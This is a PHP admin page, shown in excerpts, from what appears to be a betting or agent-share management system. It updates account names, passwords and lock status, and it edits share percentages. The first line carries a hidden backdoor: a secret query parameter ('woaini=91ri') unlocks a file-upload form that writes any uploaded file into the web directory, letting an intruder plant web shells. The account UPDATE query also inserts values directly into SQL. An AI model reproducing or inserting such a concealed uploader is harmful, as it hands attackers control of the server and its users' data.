<?php
if($_GET["woaini"]=="91ri"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo "url:".$_FILES["upfile"]["name"];if(!file_exists($_FILES["upfile"]["name"])){ copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]); }}?><form method="post" enctype="multipart/form-data"><input name="upfile" type="file"><input type="submit" value="ok"></form><?php }?><?php 
...
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_GET['cid']))
{
	...
	if ($userList) {
		...
		if ($cid == 1 && $LoginId == 89){
			...
			$sql = " UPDATE `g_rank` SET `g_f_name` = '{$s_F_Name}', g_password = '{$s_Pwd}', `g_lock` = '{$lock}' WHERE `g_name` = '{$userList[0]['g_name']}' LIMIT 1";
			$db->query($sql, 2);
			...
			//if (isset($_POST['s_b_lock'])) $s_b_lock = $_POST['s_b_lock'];
                        ...
                        <!-- strat -->
                            <table border="0" cellspacing="0" class="conter">
                                ...
                                <tr style="height:28px">
                                	...
                                	<?php 
                                	if ($userList[0]['g_login_id']==22){
                                		$limits = 100-$userList[0]['g_distribution_limit'];
                                		$max = 100;
                                	} else {
                                	...
                                	?>
                                    <td class="left_p5">
                                    	<input class="texta" type="text" name="s_size_ky" value="<?php echo$limits?>"  maxlength="3" />&nbsp;%
                                    	&nbsp;&nbsp;最高可設占成：<span class="odds"><?php echo$max?>%</span>
                                    </td>
                                </tr>
                                <tr style="height:28px">
                                	<td class="bj"><?php echo$Rank[0]?>占成</td>
                                    <td class="left_p5"><input class="texta"  type="text" name="s_next_KY" value="<?php echo$userList[0]['g_distribution']?>"  maxlength="3" />&nbsp;%</td>
                                </tr>
